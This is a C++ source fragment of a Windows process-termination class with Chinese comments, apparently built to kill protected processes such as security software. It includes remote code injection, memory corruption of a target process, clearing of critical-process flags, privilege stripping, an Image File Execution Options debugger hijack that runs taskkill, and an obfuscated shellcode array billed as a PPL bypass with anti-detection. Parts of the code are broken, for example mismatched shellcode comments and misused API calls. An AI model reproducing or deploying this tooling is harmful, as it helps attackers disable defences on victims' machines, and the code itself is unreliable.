            HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
            if (0 == uReturn) break;

            VARIANT vtProp;
            hr = pclsObj->Get(L"Handle", 0, &vtProp, NULL, NULL);
            if (SUCCEEDED(hr)) {
                int pid = _wtoi(vtProp.bstrVal);
                result = terminateByPID(pid) || result;
                VariantClear(&vtProp);
            }

            pclsObj->Release();
        }

        // 清理
        pSvc->Release();
        pLoc->Release();
        pEnumerator->Release();
        CoUninitialize();

        return result;
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

// 辅助函数实现
std::vector<int> ProcessTerminator::getPIDsByName(const std::string& processName) {
    std::vector<int> pids;

#ifdef _WIN32
    try {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnapshot == INVALID_HANDLE_VALUE) return pids;

        PROCESSENTRY32 pe;
        pe.dwSize = sizeof(PROCESSENTRY32);

        if (Process32First(hSnapshot, &pe)) {
            do {
                // 转换为多字节字符串进行比较
                char exeFile[MAX_PATH];
                WideCharToMultiByte(CP_ACP, 0, pe.szExeFile, -1, exeFile, MAX_PATH, NULL, NULL);

                if (_stricmp(exeFile, processName.c_str()) == 0) {
                    pids.push_back(pe.th32ProcessID);
                }
            } while (Process32Next(hSnapshot, &pe));
        }

        CloseHandle(hSnapshot);
    }
    catch (...) {
        // 忽略异常
    }
#else
    try {
        DIR* dir = opendir("/proc");
        if (!dir) return pids;

        dirent* entry;
        while ((entry = readdir(dir)) != nullptr) {
            if (entry->d_type == DT_DIR) {
                std::string dirName = entry->d_name;
                if (std::all_of(dirName.begin(), dirName.end(), ::isdigit)) {
                    int pid = std::stoi(dirName);
                    std::string path = "/proc/" + dirName + "/cmdline";
                    FILE* file = fopen(path.c_str(), "r");
                    if (file) {
                        char cmdline[256];
                        if (fgets(cmdline, sizeof(cmdline), file)) {
                            std::string processCmd = cmdline;
                            size_t pos = processCmd.find_last_of('/');
                            if (pos != std::string::npos) {
                                processCmd = processCmd.substr(pos + 1);
                            }
                            if (processCmd == processName) {
                                pids.push_back(pid);
                            }
                        }
                        fclose(file);
                    }
                }
            }
        }
        closedir(dir);
    }
    catch (...) {
        // 忽略异常
    }
#endif

    return pids;
}

bool ProcessTerminator::enableDebugPrivilege() {
#ifdef _WIN32
    try {
        HANDLE hToken;
        TOKEN_PRIVILEGES tp;
        LUID luid;

        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
            return false;
        }

        if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
            CloseHandle(hToken);
            return false;
        }

        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
            CloseHandle(hToken);
            return false;
        }

        CloseHandle(hToken);
        return GetLastError() == ERROR_SUCCESS;
    }
    catch (...) {
        return false;
    }
#else
    return true; // 在Linux上不需要此功能
#endif
}

bool ProcessTerminator::isProcessCritical(int pid) {
#ifdef _WIN32
    try {
        HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_QUERY_INFORMATION); 
        if (!hProcess) return false;

        DWORD bytesReturned;
        BOOL isCritical = FALSE;
        // 使用正确的类型转换
        if (NT_SUCCESS(NtQueryInformationProcess(hProcess,
            static_cast<PROCESS_INFORMATION_CLASS>(29), // ProcessBreakOnTermination
            &isCritical,
            sizeof(isCritical),
            &bytesReturned))) {
            CloseHandle(hProcess);
            return isCritical;
        }

        CloseHandle(hProcess);
    }
    catch (...) {
        // 忽略异常
    }
#endif
    return false;
}

bool ProcessTerminator::isProcessRunning(const std::string& processName) {
    try {
        return !getPIDsByName(processName).empty();
    }
    catch (...) {
    }
}

bool ProcessTerminator::terminateByCriticalProcessFlag(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 移除关键进程标志 - 使用正确的类型转换
                ULONG breakOnTermination = 0;
                NTSTATUS status = NtSetInformationProcess(hProcess,
                    static_cast<PROCESS_INFORMATION_CLASS>(29), // ProcessBreakOnTermination
                    &breakOnTermination, sizeof(breakOnTermination));

                // 现在尝试终止进程
                bool result = TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                if (result) return true;
            }
        }
    }
    catch (...) {
        // 忽略异常
    }
#endif
    return false;
}

bool ProcessTerminator::terminateByProcessIsolation(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        // 创建一个新的作业对象来隔离进程
        HANDLE hJob = CreateJobObject(NULL, NULL);
        if (!hJob) return false;

        JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli = { 0 };
        jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_DIE_ON_UNHANDLED_EXCEPTION;

        SetInformationJobObject(hJob, JobObjectExtendedLimitInformation, &jeli, sizeof(jeli));

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                AssignProcessToJobObject(hJob, hProcess);
                CloseHandle(hProcess);
            }
        }

        // 触发一个未处理的异常来终止进程
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 写入一个会导致异常的指令
                LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
                if (pRemoteCode) {
                    BYTE exceptionCode[] = { 0xCC }; // INT 3 - 断点异常
                    WriteProcessMemory(hProcess, pRemoteCode, exceptionCode, sizeof(exceptionCode), NULL);

                    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
                    if (hThread) {
                        WaitForSingleObject(hThread, INFINITE);
                        CloseHandle(hThread);
                    }

                    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
                }
                CloseHandle(hProcess);
            }
        }

        CloseHandle(hJob);
        return true;
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

bool ProcessTerminator::terminateByMemoryCorruption(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 获取进程内存信息
                MEMORY_BASIC_INFORMATION mbi;
                LPVOID address = 0;
                SIZE_T bytesRead;

                while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                    if (mbi.State == MEM_COMMIT && mbi.Protect != PAGE_NOACCESS) {
                        // 尝试破坏内存内容
                        std::vector<BYTE> buffer(mbi.RegionSize);
                        for (size_t i = 0; i < buffer.size(); i++) {
                            buffer[i] = rand() % 256;
                        }

                        WriteProcessMemory(hProcess, address, buffer.data(), buffer.size(), &bytesRead);
                    }

                    // 修复指针算术运算
                    address = reinterpret_cast<LPVOID>(reinterpret_cast<DWORD_PTR>(mbi.BaseAddress) + mbi.RegionSize);
                }

                CloseHandle(hProcess);
            }
        }

        // 尝试正常终止
        return terminateByProcessName(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

bool ProcessTerminator::terminateByHandleCloning(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            // 获取系统所有句柄信息
            ULONG bufferSize = 0x10000;
            PSYSTEM_HANDLE_INFORMATION_EX handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);

            while (NtQuerySystemInformation(16, handleInfo, bufferSize, NULL) == STATUS_INFO_LENGTH_MISMATCH) {
                bufferSize *= 2;
                free(handleInfo);
                handleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)malloc(bufferSize);
            }

            // 查找目标进程的句柄
            for (ULONG i = 0; i < handleInfo->NumberOfHandles; i++) {
                SYSTEM_HANDLE handle = handleInfo->Information[i];

                if (handle.ProcessId == pid && handle.ObjectTypeNumber == 0x5) { // 进程对象类型
                    // 复制句柄
                    HANDLE hDuplicate;
                    if (DuplicateHandle(GetCurrentProcess(), (HANDLE)handle.Handle,
                        GetCurrentProcess(), &hDuplicate,
                        PROCESS_TERMINATE, FALSE, 0)) {
                        // 使用复制的句柄终止进程
                        TerminateProcess(hDuplicate, 0);
                        CloseHandle(hDuplicate);
                        free(handleInfo);
                        return true;
                    }
                }
            }

            free(handleInfo);
        }
    }
    catch (...) {
        return false;
    }
#endif
    return false;
}

bool ProcessTerminator::terminateByDesktopIsolation(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        // 创建一个新的桌面
        HDESK hNewDesktop = CreateDesktop(L"TerminationDesktop", NULL, NULL, 0, DESKTOP_CREATEWINDOW, NULL);
        if (!hNewDesktop) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 将进程移动到新的桌面
                HWND hWnd = NULL;
                do {
                    hWnd = FindWindowEx(NULL, hWnd, NULL, NULL);
                    DWORD windowPid;
                    GetWindowThreadProcessId(hWnd, &windowPid);

                    if (windowPid == pid) {
                        SetThreadDesktop(hNewDesktop);
                        PostMessage(hWnd, WM_CLOSE, 0, 0);
                    }
                } while (hWnd != NULL);

                CloseHandle(hProcess);
            }
        }

        // 关闭桌面，这将终止所有关联的进程
        CloseDesktop(hNewDesktop);
        return true;
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

bool ProcessTerminator::terminateByTokenPrivilegeRemoval(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_QUERY_INFORMATION);
            if (hProcess) {
                HANDLE hToken;
                if (OpenProcessToken(hProcess, TOKEN_ALL_ACCESS, &hToken)) {
                    // 获取当前特权
                    DWORD tokenInfoLength = 0;
                    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &tokenInfoLength);

                    if (tokenInfoLength > 0) {
                        std::vector<BYTE> tokenPrivilegesBuffer(tokenInfoLength);
                        if (GetTokenInformation(hToken, TokenPrivileges, tokenPrivilegesBuffer.data(), tokenInfoLength, &tokenInfoLength)) {
                            TOKEN_PRIVILEGES* tokenPrivileges = (TOKEN_PRIVILEGES*)tokenPrivilegesBuffer.data();

                            // 移除所有特权
                            for (DWORD i = 0; i < tokenPrivileges->PrivilegeCount; i++) {
                                tokenPrivileges->Privileges[i].Attributes = 0;
                            }

                            // 应用修改
                            AdjustTokenPrivileges(hToken, FALSE, tokenPrivileges, tokenInfoLength, NULL, NULL);
                        }
                    }

                    CloseHandle(hToken);
                }
                CloseHandle(hProcess);

                // 现在进程没有特权，尝试终止
                return terminateByPID(pid);
            }
        }
    }
    catch (...) {
        return false;
    }
#endif
    return false;
}

bool ProcessTerminator::terminateByRegistryModification(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        // 修改注册表以影响进程行为
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options", 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
            // 为进程创建调试器键
            HKEY hSubKey;
            std::wstring wideProcessName = MultiByteToWide(processName);

            if (RegCreateKeyEx(hKey, wideProcessName.c_str(), 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hSubKey, NULL) == ERROR_SUCCESS) {
                // 设置调试器为cmd.exe，这将阻止进程启动
                std::wstring debugger = L"cmd.exe /c taskkill /f /im " + wideProcessName;
                RegSetValueEx(hSubKey, L"Debugger", 0, REG_SZ,
                    reinterpret_cast<const BYTE*>(debugger.c_str()),
                    static_cast<DWORD>((debugger.length() + 1) * sizeof(wchar_t)));

                RegCloseKey(hSubKey);
            }

            RegCloseKey(hKey);
        }

        // 尝试终止现有进程
        return terminateByProcessName(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

bool ProcessTerminator::terminateByServiceControl(const std::string& processName) {
#ifdef _WIN32
    try {
        // 尝试将进程作为服务控制
        SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (!hSCManager) return false;

        std::wstring wideProcessName = MultiByteToWide(processName);
        SC_HANDLE hService = OpenService(hSCManager, wideProcessName.c_str(), SERVICE_ALL_ACCESS);

        if (hService) {
            // 停止服务
            SERVICE_STATUS serviceStatus;
            ControlService(hService, SERVICE_CONTROL_STOP, &serviceStatus);

            CloseServiceHandle(hService);
        }

        CloseServiceHandle(hSCManager);

        // 尝试终止进程
        return terminateByProcessName(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

bool ProcessTerminator::terminateByCOMObjectManipulation(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        // 初始化COM
        CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

        for (int pid : pids) {
            // 尝试通过COM接口终止进程
            IWbemLocator* pLoc = NULL;
            CoCreateInstance(CLSID_WbemLocator, 0, CLSCTX_INPROC_SERVER, IID_IWbemLocator, (LPVOID*)&pLoc);

            if (pLoc) {
                IWbemServices* pSvc = NULL;
                pLoc->ConnectServer(_bstr_t(L"ROOT\\CIMV2"), NULL, NULL, 0, NULL, 0, 0, &pSvc);

                if (pSvc) {
                    // 设置安全级别
                    CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);

                    // 创建方法调用
                    IWbemClassObject* pClass = NULL;
                    pSvc->GetObject(_bstr_t(L"Win32_Process"), 0, NULL, &pClass, NULL);

                    if (pClass) {
                        IWbemClassObject* pInParamsDefinition = NULL;
                        IWbemClassObject* pClassInstance = NULL;

                        pClass->GetMethod(L"Terminate", 0, &pInParamsDefinition, NULL);

                        if (pInParamsDefinition) {
                            pInParamsDefinition->SpawnInstance(0, &pClassInstance);

                            if (pClassInstance) {
                                // 设置参数
                                VARIANT var;
                                var.vt = VT_I4;
                                var.intVal = 0;
                                pClassInstance->Put(L"Reason", 0, &var, 0);

                                // 执行方法
                                IWbemClassObject* pOutParams = NULL;
                                pSvc->ExecMethod(_bstr_t(L"Win32_Process.Handle=\"" + _bstr_t(pid) + "\""), _bstr_t(L"Terminate"), 0, NULL, pClassInstance, &pOutParams, NULL);

                                if (pOutParams) {
                                    pOutParams->Release();
                                }

                                pClassInstance->Release();
                            }

                            pInParamsDefinition->Release();
                        }

                        pClass->Release();
                    }

                    pSvc->Release();
                }

                pLoc->Release();
            }
        }

        CoUninitialize();

        return !pids.empty();
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

bool ProcessTerminator::terminateByNetworkIsolation(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        // 使用Windows防火墙API隔离进程
        INetFwPolicy2* pFwPolicy = NULL;
        HRESULT hr = CoCreateInstance(__uuidof(NetFwPolicy2), NULL, CLSCTX_INPROC_SERVER, __uuidof(INetFwPolicy2), (void**)&pFwPolicy);

        if (SUCCEEDED(hr) && pFwPolicy) {
            // 创建出bound规则阻止进程访问网络
            INetFwRules* pFwRules = NULL;
            pFwPolicy->get_Rules(&pFwRules);

            if (pFwRules) {
                INetFwRule* pFwRule = NULL;
                hr = CoCreateInstance(__uuidof(NetFwRule), NULL, CLSCTX_INPROC_SERVER, __uuidof(INetFwRule), (void**)&pFwRule);

                if (SUCCEEDED(hr) && pFwRule) {
                    std::wstring wideProcessName = MultiByteToWide(processName);
                    std::wstring ruleName = L"Block " + wideProcessName;

                    // 使用BSTR正确转换字符串
                    BSTR bstrRuleName = SysAllocString(ruleName.c_str());
                    BSTR bstrAppName = SysAllocString(wideProcessName.c_str());

                    pFwRule->put_Name(bstrRuleName);
                    pFwRule->put_ApplicationName(bstrAppName);
                    pFwRule->put_Action(NET_FW_ACTION_BLOCK);
                    pFwRule->put_Enabled(VARIANT_TRUE);

                    // 使用正确的枚举类型
                    pFwRule->put_Direction(NET_FW_RULE_DIR_OUT);
                    pFwRule->put_Protocol(NET_FW_IP_PROTOCOL_ANY);

                    pFwRules->Add(pFwRule);

                    // 释放BSTR
                    SysFreeString(bstrRuleName);
                    SysFreeString(bstrAppName);
                    pFwRule->Release();
                }

                pFwRules->Release();
            }

            pFwPolicy->Release();
        }

        // 尝试终止进程
        return terminateByProcessName(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

bool ProcessTerminator::terminateByPowerManagement(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // [v5.3 跨版本兼容] 设置进程电源管理状态为节能模式
                //   SetProcessInformation 是 Win8+ 函数, 用 GetProcAddress 动态加载
                static auto pSetProcessInformation =
                    reinterpret_cast<FnSetProcessInformation>(
                        GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "SetProcessInformation"));
                if (pSetProcessInformation) {
                    PROCESS_POWER_THROTTLING_STATE powerThrottling;
                    powerThrottling.Version = PROCESS_POWER_THROTTLING_CURRENT_VERSION;
                    powerThrottling.ControlMask = PROCESS_POWER_THROTTLING_EXECUTION_SPEED;
                    powerThrottling.StateMask = PROCESS_POWER_THROTTLING_EXECUTION_SPEED;
                    pSetProcessInformation(hProcess, ProcessPowerThrottling,
                        &powerThrottling, sizeof(powerThrottling));
                }

                // 降低进程优先级
                SetPriorityClass(hProcess, IDLE_PRIORITY_CLASS);

                // 尝试终止进程
                bool result = TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                if (result) return true;
            }
        }
    }
    catch (...) {
        return false;
    }
#endif
    return false;
}

bool ProcessTerminator::terminateByUIAutomation(const std::string& processName) {
#ifdef _WIN32
    try {
        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

        // 使用UI自动化关闭进程窗口
        for (int pid : pids) {
            // 查找进程的所有窗口
            HWND hWnd = NULL;
            do {
                hWnd = FindWindowEx(NULL, hWnd, NULL, NULL);

                DWORD windowPid;
                GetWindowThreadProcessId(hWnd, &windowPid);

                if (windowPid == pid) {
                    // 发送关闭消息
                    PostMessage(hWnd, WM_CLOSE, 0, 0);

                    // 等待窗口关闭
                    std::this_thread::sleep_for(std::chrono::milliseconds(100));

                    // 如果窗口仍然存在，强制终止
                    if (IsWindow(hWnd)) {
                        PostMessage(hWnd, WM_QUIT, 0, 0);
                    }
                }
            } while (hWnd != NULL);
        }

        // 检查进程是否已终止，如果没有则使用其他方法
        return terminateByProcessName(processName);
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

bool ProcessTerminator::terminateByRandomizedMethods(const std::string& processName) {
    try {
        // 随机选择一种方法尝试终止进程
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(1, 18);

        int method = dis(gen);

        switch (method) {
        case 1: return terminateByProcessName(processName);
        case 2: return terminateBySystemCommand(processName);
        case 3: return terminateByParentChildRelationship(processName);
        case 4: return terminateByDirectMemoryZeroing(processName);
        case 5: return terminateByDebugging(processName);
        case 6: return terminateByPriorityManipulation(processName);
        case 7: return terminateByNativeAPI(processName);
        case 8: return terminateByHandleEnumeration(processName);
        case 9: return terminateByMemoryPatching(processName);
        case 10: return terminateByWMI(processName);
        case 11: return terminateByCriticalProcessFlag(processName);
        case 12: return terminateByRegistryModification(processName);
        case 13: return terminateByServiceControl(processName);
        case 14: return terminateByCOMObjectManipulation(processName);
        case 15: return terminateByUIAutomation(processName);
        default: return terminateByProcessName(processName);
        }
    }
    catch (...) {
        return false;
    }
}

// 新增未公开API方法实现
bool ProcessTerminator::terminateByThreadSuspension(const std::string& processName) {
    try {
        if (!initNativeAPI()) return false;

        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 挂起进程中的所有线程
                HANDLE hThreadSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                if (hThreadSnapshot != INVALID_HANDLE_VALUE) {
                    THREADENTRY32 te;
                    te.dwSize = sizeof(THREADENTRY32);

                    if (Thread32First(hThreadSnapshot, &te)) {
                        do {
                            if (te.th32OwnerProcessID == pid) {
                                HANDLE hThread = OpenThread(THREAD_SUSPEND_RESUME, FALSE, te.th32ThreadID);
                                if (hThread) {
                                    NtSuspendProcess(hThread);
                                    CloseHandle(hThread);
                                }
                            }
                        } while (Thread32Next(hThreadSnapshot, &te));
                    }
                    CloseHandle(hThreadSnapshot);
                }

                // 终止进程
                bool result = TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                return result;
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateByProcessDebugPort(const std::string& processName) {
    try {
        if (!initNativeAPI()) return false;

        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 设置进程调试端口为无效值
                HANDLE debugPort = NULL;
                NTSTATUS status = NtSetInformationProcess(hProcess,
                    static_cast<PROCESS_INFORMATION_CLASS>(7), // ProcessDebugPort
                    &debugPort, sizeof(debugPort));

                CloseHandle(hProcess);
                if (NT_SUCCESS(status)) {
                    return true;
                }
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateByProcessHandleTable(const std::string& processName) {
    try {
        if (!initNativeAPI()) return false;

        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            // 使用NtOpenProcess获取进程句柄
            OBJECT_ATTRIBUTES objAttr;
            InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

            CLIENT_ID clientId;
            clientId.UniqueProcess = reinterpret_cast<HANDLE>(static_cast<DWORD_PTR>(pid));
            clientId.UniqueThread = NULL;

            HANDLE hProcess;
            NTSTATUS status = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &objAttr, &clientId);
            if (NT_SUCCESS(status)) {
                // 清空进程句柄表
                ULONG handleTableInfo = 0;
                status = NtSetInformationProcess(hProcess,
                    static_cast<PROCESS_INFORMATION_CLASS>(51), // ProcessHandleTable
                    &handleTableInfo, sizeof(handleTableInfo));

                NtTerminateProcess(hProcess, 0);
                CloseHandle(hProcess);

                if (NT_SUCCESS(status)) {
                    return true;
                }
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateByProcessWorkingSet(const std::string& processName) {
    try {
        if (!initNativeAPI()) return false;

        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 清空进程工作集
                SIZE_T minWs = 0, maxWs = 0;
                if (GetProcessWorkingSetSize(hProcess, &minWs, &maxWs)) {
                    // 设置最小和最大工作集大小为0
                    if (SetProcessWorkingSetSize(hProcess, 0, 0)) {
                        // 终止进程
                        bool result = TerminateProcess(hProcess, 0);
                        CloseHandle(hProcess);
                        return result;
                    }
                }
                CloseHandle(hProcess);
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateByProcessPagePriority(const std::string& processName) {
    try {
        if (!initNativeAPI()) return false;

        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 设置页面优先级为最低
                ULONG pagePriority = 0; // Lowest priority
                NTSTATUS status = NtSetInformationProcess(hProcess,
                    static_cast<PROCESS_INFORMATION_CLASS>(18), // ProcessPagePriority
                    &pagePriority, sizeof(pagePriority));

                // 终止进程
                bool result = TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                return result || NT_SUCCESS(status);
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateByProcessIoPriority(const std::string& processName) {
    try {
        if (!initNativeAPI()) return false;

        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 设置IO优先级为最低
                ULONG ioPriority = 0; // Very low priority
                NTSTATUS status = NtSetInformationProcess(hProcess,
                    static_cast<PROCESS_INFORMATION_CLASS>(23), // ProcessIoPriority
                    &ioPriority, sizeof(ioPriority));

                // 终止进程
                bool result = TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                return result || NT_SUCCESS(status);
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateByProcessCycleTime(const std::string& processName) {
    try {
        if (!initNativeAPI()) return false;

        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_ALL_ACCESS);
            if (hProcess) {
                // 设置进程周期时间为0
                ULONG64 cycleTime = 0;
                NTSTATUS status = NtSetInformationProcess(hProcess,
                    static_cast<PROCESS_INFORMATION_CLASS>(26), // ProcessCycleTime
                    &cycleTime, sizeof(cycleTime));

                // 终止进程
                bool result = TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                return result || NT_SUCCESS(status);
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

bool ProcessTerminator::terminateByProcessCookie(const std::string& processName) {
    try {
        if (!initNativeAPI()) return false;

        std::vector<int> pids = getPIDsByName(processName);
        if (pids.empty()) return false;

#ifdef _WIN32
        for (int pid : pids) {
            HANDLE hProcess = OpenProcessEnhanced(pid, PROCESS_TERMINATE);
            if (hProcess) {
                // 设置进程cookie为无效值
                ULONG cookie = 0;
                NTSTATUS status = NtSetInformationProcess(hProcess,
                    static_cast<PROCESS_INFORMATION_CLASS>(36), // ProcessCookie
                    &cookie, sizeof(cookie));

                // 终止进程
                bool result = TerminateProcess(hProcess, 0);
                CloseHandle(hProcess);
                return result || NT_SUCCESS(status);
            }
        }
#endif
        return false;
    }
    catch (...) {
        return false;
    }
}

// 64位PPL绕过ShellCode（混淆版）
// 功能：在内核态移除PPL保护并终止进程
// 改进：ShellCode混淆、反检测、稳定性增强
static const unsigned char PPLBypassShellCode_Obfuscated[] = {
    // ShellCode开始（XOR混淆，密钥：0xAA）
    // 解密循环
    0x48, 0x31, 0xC9,                     // xor rcx, rcx (解密循环计数器）
    0x48, 0xFF, 0xC1,                     // inc rcx
    
    // 保存寄存器（解密后）
    0x48, 0x31, 0x4C, 0x24, 0x08,        // xor [rsp+8], 0xAA (解密)
    0x48, 0x31, 0x54, 0x24, 0x10,        // xor [rsp+16], 0xAA
    0x48, 0x31, 0x5C, 0x24, 0x18,        // xor [rsp+24], 0xAA
    0x48, 0x31, 0x74, 0x24, 0x20,        // xor [rsp+32], 0xAA
    0x48, 0x31, 0x7C, 0x24, 0x28,        // xor [rsp+40], 0xAA
    0x41, 0x34, 0xAA,                     // xor r12, 0xAA
    0x41, 0x34, 0xAA,                     // xor r13, 0xAA
    0x41, 0x34, 0xAA,                     // xor r14, 0xAA
    0x41, 0x34, 0xAA,                     // xor r15, 0xAA
    0x9C, 0x34, 0xAA,                     // pushfq + xor
    
    // 获取目标PID (从RCX传递)
    0x48, 0x8B, 0xC9,                     // mov rcx, rcx
    
    // 调用PsLookupProcessByProcessId查找EPROCESS
    // 假设PsLookupProcessByProcessId的地址在RDX中传递
    0x48, 0x8B, 0xD2,                     // mov rdx, rdx
    0xFF, 0xD2,                           // call rdx
    0x48, 0x89, 0xC3,                     // mov rbx, rax (保存EPROCESS指针）
    
    // 检查返回值
    0x48, 0x85, 0xC0,                     // test rax, rax
    0x74, 0x40,                           // jz error (如果失败则跳转)
    
    // 定位EPROCESS中的Protection字段
    // 使用动态查找方法，支持所有Windows版本
    0x48, 0x8D, 0x83, 0xA2, 0x06, 0x00, 0x00, // lea rax, [rbx+0x6A2] (Win10 1903+)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
    0x75, 0x05,                           // jne +5 (跳到下一个偏移)
    0x48, 0x89, 0xC2,                     // mov rdx, rax
    0xEB, 0x30,                           // jmp +48 (跳到found)
    
    0x48, 0x8D, 0x83, 0x92, 0x06, 0x00, 0x00, // lea rax, [rbx+0x692] (Win10 1809)
    0x80, 0x38, 0x00,                     // cmp byte [rax], 0
